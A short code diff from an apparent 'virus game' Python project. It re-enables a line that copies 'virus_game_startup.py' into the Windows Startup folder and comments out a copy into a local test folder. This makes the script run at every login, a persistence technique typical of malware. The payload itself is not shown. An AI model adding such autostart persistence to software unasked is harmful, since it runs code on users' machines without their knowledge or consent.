@@ -28,8 +28,8 @@ if sys.platform == "win32":
     shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
 file_table = [
-    # (f"{curr_location}/src/virus_game_startup.py", f"{shell_startup_dir}/virus_game_startup.py", False),
-    (f"{curr_location}/src/virus_game_startup.py", f"{curr_location}/test/virus_game_startup_copy.py")
+    (f"{curr_location}/src/virus_game_startup.py", f"{shell_startup_dir}/virus_game_startup.py", False),
+    # (f"{curr_location}/src/virus_game_startup.py", f"{curr_location}/test/virus_game_startup_copy.py")
 ]
 
 for source, dest, makedirs in file_table:
